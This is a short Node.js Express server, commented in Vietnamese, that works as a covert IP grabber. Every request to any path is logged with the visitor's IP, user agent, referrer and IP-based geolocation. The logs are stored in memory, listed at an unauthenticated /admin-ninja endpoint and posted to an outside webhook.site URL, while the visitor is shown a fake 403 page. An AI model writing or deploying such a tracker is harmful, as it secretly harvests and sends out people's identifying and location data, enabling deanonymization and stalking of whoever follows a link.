const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Log lưu trong RAM
let localLogs = [];

app.get('/admin-ninja', (req, res) => {
  res.json(localLogs);
});

app.get('*', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referrer = req.headers['referer'] || 'Direct';

  let logData = {
    message: 'Có người truy cập web ninja!',
    ip,
    userAgent,
    referrer,
    time: new Date().toISOString()
  };

  try {
    // Lấy vị trí địa lý từ IP
    const geo = await axios.get(`https://ipapi.co/${ip}/json/`);
    logData.location = geo.data;
  } catch (err) {
    logData.location = { error: 'Không lấy được location' };
  }

  // Lưu vào bộ nhớ cục bộ
  localLogs.push(logData);

  // Gửi ra ngoài webhook
  try {
    await axios.post('https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890', logData);
  } catch (err) {
    console.error('Gửi webhook lỗi:', err.message);
  }

  // Trả về trang giả 403
  res.status(403).sendFile(path.join(__dirname, '403.html'));
});

app.listen(PORT, () => {
  console.log(`Ninja đang chạy ở cổng ${PORT}`);
});
